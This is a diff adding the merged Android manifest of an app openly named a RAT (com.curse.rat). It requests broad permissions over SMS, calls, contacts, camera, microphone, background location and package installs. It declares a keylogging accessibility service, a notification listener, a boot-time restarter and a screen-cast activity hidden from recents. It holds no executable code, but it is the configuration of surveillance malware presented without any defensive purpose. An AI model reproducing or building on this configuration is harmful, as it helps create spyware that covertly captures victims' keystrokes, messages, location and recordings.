@@ -1,0 +1,388 @@
+1<?xml version="1.0" encoding="utf-8"?>
+2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+3    package="com.curse.rat"
+4    android:versionCode="1"
+5    android:versionName="1.0" >
+6
+7    <uses-sdk
+8        android:minSdkVersion="24"
+8-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml
+9        android:targetSdkVersion="33" />
+9-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml
+10
+11    <!-- Standard Permissions -->
+12    <uses-permission android:name="android.permission.INTERNET" />
+12-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:6:5-67
+12-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:6:22-64
+13    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+13-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:7:5-79
+13-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:7:22-76
+14    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+14-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:8:5-80
+14-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:8:22-77
+15    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+15-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:9:5-81
+15-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:9:22-78
+16    <uses-permission android:name="android.permission.CAMERA" />
+16-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:10:5-65
+16-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:10:22-62
+17    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+17-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:11:5-71
+17-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:11:22-68
+18    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
+18-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:12:5-80
+18-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:12:22-77
+19    <uses-permission android:name="android.permission.READ_SMS" />
+19-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:13:5-67
+19-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:13:22-64
+20    <uses-permission android:name="android.permission.SEND_SMS" />
+20-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:14:5-67
+20-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:14:22-64
+21    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+21-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:15:5-70
+21-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:15:22-67
+22    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+22-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:16:5-81
+22-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:16:22-78
+23    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+23-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:17:5-75
+23-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:17:22-72
+24    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+24-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:18:5-72
+24-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:18:22-69
+25    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+25-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:19:5-79
+25-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:19:22-76
+26    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+26-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:20:5-81
+26-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:20:22-78
+27    <uses-permission android:name="android.permission.READ_CONTACTS" />
+27-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:21:5-72
+27-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:21:22-69
+28    <uses-permission android:name="android.permission.WAKE_LOCK" />
+28-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:22:5-68
+28-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:22:22-65
+29    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+29-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:23:5-77
+29-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:23:22-74
+30    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
+30-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:24:5-94
+30-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:24:22-91
+31    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+31-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:25:5-95
+31-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:25:22-92
+32    <uses-permission android:name="android.permission.VIBRATE" />
+32-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:26:5-66
+32-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:26:22-63
+33
+34    <!-- Additional Permissions requested by user -->
+35    <uses-permission android:name="android.permission.WRITE_CONTACTS" />
+35-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:29:5-73
+35-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:29:22-70
+36    <uses-permission android:name="android.permission.GET_ACCOUNTS" />
+36-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:30:5-71
+36-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:30:22-68
+37    <uses-permission android:name="android.permission.WRITE_CALL_LOG" />
+37-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:31:5-73
+37-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:31:22-70
+38    <uses-permission android:name="android.permission.CALL_PHONE" />
+38-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:32:5-69
+38-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:32:22-66
+39    <uses-permission android:name="android.permission.READ_PHONE_NUMBERS" />
+39-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:33:5-77
+39-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:33:22-74
+40    <uses-permission android:name="android.permission.ANSWER_PHONE_CALLS" />
+40-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:34:5-77
+40-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:34:22-74
+41    <uses-permission android:name="android.permission.ADD_VOICEMAIL" />
+41-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:35:5-72
+41-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:35:22-69
+42    <uses-permission android:name="android.permission.USE_SIP" />
+42-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:36:5-66
+42-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:36:22-63
+43    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
+43-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:37:5-81
+43-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:37:22-78
+44    <uses-permission android:name="android.permission.RECEIVE_WAP_PUSH" />
+44-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:38:5-75
+44-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:38:22-72
+45    <uses-permission android:name="android.permission.RECEIVE_MMS" />
+45-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:39:5-70
+45-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:39:22-67
+46    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
+46-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:40:5-85
+46-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:40:22-82
+47    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
+47-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:41:5-82
+47-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:41:22-79
+48    <uses-permission android:name="android.permission.ACCESS_MEDIA_LOCATION" />
+48-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:42:5-80
+48-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:42:22-77
+49    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
+49-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:43:5-76
+49-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:43:22-73
+50    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
+50-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:44:5-75
+50-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:44:22-72
+51    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
+51-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:45:5-75
+51-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:45:22-72
+52    <uses-permission android:name="android.permission.BLUETOOTH" />
+52-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:46:5-68
+52-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:46:22-65
+53    <uses-permission android:name="android.permission.BLUETOOTH_ADMIN" />
+53-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:47:5-74
+53-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:47:22-71
+54    <uses-permission android:name="android.permission.BLUETOOTH_CONNECT" />
+54-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:48:5-76
+54-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:48:22-73
+55    <uses-permission android:name="android.permission.BLUETOOTH_SCAN" />
+55-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:49:5-73
+55-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:49:22-70
+56    <uses-permission android:name="android.permission.BLUETOOTH_ADVERTISE" />
+56-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:50:5-78
+56-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:50:22-75
+57    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
+57-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:51:5-76
+57-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:51:22-73
+58    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+58-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:52:5-76
+58-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:52:22-73
+59    <uses-permission android:name="android.permission.NFC" />
+59-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:53:5-62
+59-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:53:22-59
+60    <uses-permission android:name="android.permission.BODY_SENSORS" />
+60-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:54:5-71
+60-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:54:22-68
+61    <uses-permission android:name="android.permission.BODY_SENSORS_BACKGROUND" />
+61-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:55:5-82
+61-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:55:22-79
+62    <uses-permission android:name="android.permission.ACTIVITY_RECOGNITION" />
+62-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:56:5-79
+62-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:56:22-76
+63    <uses-permission android:name="android.permission.USE_BIOMETRIC" />
+63-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:57:5-72
+63-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:57:22-69
+64    <uses-permission android:name="android.permission.USE_FINGERPRINT" />
+64-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:58:5-74
+64-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:58:22-71
+65    <uses-permission android:name="android.permission.SET_WALLPAPER" />
+65-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:59:5-72
+65-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:59:22-69
+66    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
+66-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:60:5-83
+66-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:60:22-80
+67    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+67-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:61:5-78
+67-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:61:22-75
+68    <uses-permission android:name="android.permission.WRITE_SETTINGS" />
+68-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:62:5-73
+68-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:62:22-70
+69    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
+69-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:63:5-79
+69-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:63:22-76
+70    <uses-permission android:name="android.permission.DISABLE_KEYGUARD" />
+70-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:64:5-75
+70-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:64:22-72
+71    <uses-permission android:name="android.permission.EXPAND_STATUS_BAR" />
+71-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:65:5-76
+71-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:65:22-73
+72    <uses-permission android:name="android.permission.FLASHLIGHT" />
+72-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:66:5-69
+72-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:66:22-66
+73    <uses-permission android:name="android.permission.GET_TASKS" />
+73-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:67:5-68
+73-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:67:22-65
+74    <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES" />
+74-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:68:5-84
+74-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:68:22-81
+75    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" />
+75-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:69:5-78
+75-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:69:22-75
+76    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+76-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:70:5-77
+76-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:70:22-74
+77    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
+77-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:71:5-77
+77-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:71:22-74
+78    <uses-permission android:name="android.permission.READ_LOGS" />
+78-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:72:5-68
+78-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:72:22-65
+79    <uses-permission android:name="android.permission.REBOOT" />
+79-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:73:5-65
+79-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:73:22-62
+80    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
+80-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:74:5-79
+80-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:74:22-76
+81    <uses-permission android:name="android.permission.USE_EXACT_ALARM" />
+81-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:75:5-74
+81-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:75:22-71
+82    <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS" />
+82-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:76:5-80
+82-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:76:22-77
+83
+84    <uses-feature
+84-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:78:5-85
+85        android:name="android.hardware.camera"
+85-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:78:19-57
+86        android:required="false" />
+86-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:78:58-82
+87    <uses-feature
+87-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:79:5-95
+88        android:name="android.hardware.camera.autofocus"
+88-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:79:19-67
+89        android:required="false" />
+89-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:79:68-92
+90
+91    <permission
+91-->[androidx.core:core:1.9.0] /root/.gradle/caches/transforms-3/ea8998703fee7fd78e5f5a6ddcbea144/transformed/core-1.9.0/AndroidManifest.xml:22:5-24:47
+92        android:name="com.curse.rat.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
+92-->[androidx.core:core:1.9.0] /root/.gradle/caches/transforms-3/ea8998703fee7fd78e5f5a6ddcbea144/transformed/core-1.9.0/AndroidManifest.xml:23:9-81
+93        android:protectionLevel="signature" />
+93-->[androidx.core:core:1.9.0] /root/.gradle/caches/transforms-3/ea8998703fee7fd78e5f5a6ddcbea144/transformed/core-1.9.0/AndroidManifest.xml:24:9-44
+94
+95    <uses-permission android:name="com.curse.rat.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />
+95-->[androidx.core:core:1.9.0] /root/.gradle/caches/transforms-3/ea8998703fee7fd78e5f5a6ddcbea144/transformed/core-1.9.0/AndroidManifest.xml:26:5-97
+95-->[androidx.core:core:1.9.0] /root/.gradle/caches/transforms-3/ea8998703fee7fd78e5f5a6ddcbea144/transformed/core-1.9.0/AndroidManifest.xml:26:22-94
+96
+97    <application
+97-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:81:5-136:19
+98        android:allowBackup="true"
+98-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:82:9-35
+99        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
+99-->[androidx.core:core:1.9.0] /root/.gradle/caches/transforms-3/ea8998703fee7fd78e5f5a6ddcbea144/transformed/core-1.9.0/AndroidManifest.xml:28:18-86
+100        android:debuggable="true"
+101        android:extractNativeLibs="false"
+102        android:icon="@mipmap/ic_launcher"
+102-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:83:9-43
+103        android:label="@string/app_name"
+103-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:84:9-41
+104        android:requestLegacyExternalStorage="true"
+104-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:88:9-52
+105        android:roundIcon="@mipmap/ic_launcher_round"
+105-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:85:9-54
+106        android:supportsRtl="true"
+106-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:86:9-35
+107        android:theme="@style/Theme.AppCompat.NoActionBar"
+107-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:87:9-59
+108        android:usesCleartextTraffic="true" >
+108-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:89:9-44
+109        <activity
+109-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:91:9-98:20
+110            android:name="com.curse.rat.MainActivity"
+110-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:91:19-47
+111            android:configChanges="orientation|keyboardHidden|screenSize"
+111-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:93:13-74
+112            android:exported="true" >
+112-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:92:13-36
+113            <intent-filter>
+113-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:94:13-97:29
+114                <action android:name="android.intent.action.MAIN" />
+114-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:95:17-69
+114-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:95:25-66
+115
+116                <category android:name="android.intent.category.LAUNCHER" />
+116-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:96:17-77
+116-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:96:27-74
+117            </intent-filter>
+118        </activity>
+119        <activity
+119-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:100:9-103:40
+120            android:name="com.curse.rat.ScreenCastActivity"
+120-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:100:19-53
+121            android:excludeFromRecents="true"
+121-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:102:13-46
+122            android:exported="false"
+122-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:103:13-37
+123            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+123-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:101:13-72
+124
+125        <service
+125-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:105:9-109:63
+126            android:name="com.curse.rat.MainService"
+126-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:106:13-40
+127            android:enabled="true"
+127-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:107:13-35
+128            android:exported="true"
+128-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:108:13-36
+129            android:foregroundServiceType="mediaProjection" />
+129-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:109:13-60
+130
+131        <receiver
+131-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:111:9-117:20
+132            android:name="com.curse.rat.MainService$Restarter"
+132-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:111:19-56
+133            android:enabled="true"
+133-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:112:13-35
+134            android:exported="true" >
+134-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:113:13-36
+135            <intent-filter>
+135-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:114:13-116:29
+136                <action android:name="android.intent.action.BOOT_COMPLETED" />
+136-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:115:17-79
+136-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:115:25-76
+137            </intent-filter>
+138        </receiver>
+139
+140        <service
+140-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:119:9-127:19
+141            android:name="com.curse.rat.KeylogManager"
+141-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:119:18-47
+142            android:exported="true"
+142-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:121:13-36
+143            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" >
+143-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:120:13-79
+144            <intent-filter>
+144-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:122:13-124:29
+145                <action android:name="android.view.accessibility.AccessibilityService" />
+145-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:123:17-90
+145-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:123:25-87
+146            </intent-filter>
+147
+148            <meta-data
+148-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:125:13-126:72
+149                android:name="android.view.accessibility.AccessibilityService"
+149-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:125:24-86
+150                android:resource="@xml/accessibility_service_config" />
+150-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:126:17-69
+151        </service>
+152        <service
+152-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:129:9-135:19
+153            android:name="com.curse.rat.NotificationManager"
+153-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:129:18-53
+154            android:exported="true"
+154-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:131:13-36
+155            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" >
+155-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:130:13-87
+156            <intent-filter>
+156-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:132:13-134:29
+157                <action android:name="android.service.notification.NotificationListenerService" />
+157-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:133:17-99
+157-->/root/CURSE-RAT/client/app/src/main/AndroidManifest.xml:133:25-96
+158            </intent-filter>
+159        </service>
+160
+161        <provider
+161-->[androidx.emoji2:emoji2:1.2.0] /root/.gradle/caches/transforms-3/d73acfe8d1c6d895b1d46698bf1933cc/transformed/jetified-emoji2-1.2.0/AndroidManifest.xml:24:9-32:20
+162            android:name="androidx.startup.InitializationProvider"
+162-->[androidx.emoji2:emoji2:1.2.0] /root/.gradle/caches/transforms-3/d73acfe8d1c6d895b1d46698bf1933cc/transformed/jetified-emoji2-1.2.0/AndroidManifest.xml:25:13-67
+163            android:authorities="com.curse.rat.androidx-startup"
+163-->[androidx.emoji2:emoji2:1.2.0] /root/.gradle/caches/transforms-3/d73acfe8d1c6d895b1d46698bf1933cc/transformed/jetified-emoji2-1.2.0/AndroidManifest.xml:26:13-68
+164            android:exported="false" >
+164-->[androidx.emoji2:emoji2:1.2.0] /root/.gradle/caches/transforms-3/d73acfe8d1c6d895b1d46698bf1933cc/transformed/jetified-emoji2-1.2.0/AndroidManifest.xml:27:13-37
+165            <meta-data
+165-->[androidx.emoji2:emoji2:1.2.0] /root/.gradle/caches/transforms-3/d73acfe8d1c6d895b1d46698bf1933cc/transformed/jetified-emoji2-1.2.0/AndroidManifest.xml:29:13-31:52
+166                android:name="androidx.emoji2.text.EmojiCompatInitializer"
+166-->[androidx.emoji2:emoji2:1.2.0] /root/.gradle/caches/transforms-3/d73acfe8d1c6d895b1d46698bf1933cc/transformed/jetified-emoji2-1.2.0/AndroidManifest.xml:30:17-75
+167                android:value="androidx.startup" />
+167-->[androidx.emoji2:emoji2:1.2.0] /root/.gradle/caches/transforms-3/d73acfe8d1c6d895b1d46698bf1933cc/transformed/jetified-emoji2-1.2.0/AndroidManifest.xml:31:17-49
+168            <meta-data
+168-->[androidx.lifecycle:lifecycle-process:2.4.1] /root/.gradle/caches/transforms-3/44add69d5502d3b3ebaf9ab034f2a136/transformed/jetified-lifecycle-process-2.4.1/AndroidManifest.xml:31:13-33:52
+169                android:name="androidx.lifecycle.ProcessLifecycleInitializer"
+169-->[androidx.lifecycle:lifecycle-process:2.4.1] /root/.gradle/caches/transforms-3/44add69d5502d3b3ebaf9ab034f2a136/transformed/jetified-lifecycle-process-2.4.1/AndroidManifest.xml:32:17-78
+170                android:value="androidx.startup" />
+170-->[androidx.lifecycle:lifecycle-process:2.4.1] /root/.gradle/caches/transforms-3/44add69d5502d3b3ebaf9ab034f2a136/transformed/jetified-lifecycle-process-2.4.1/AndroidManifest.xml:33:17-49
+171        </provider>
+172    </application>
+173
+174</manifest>
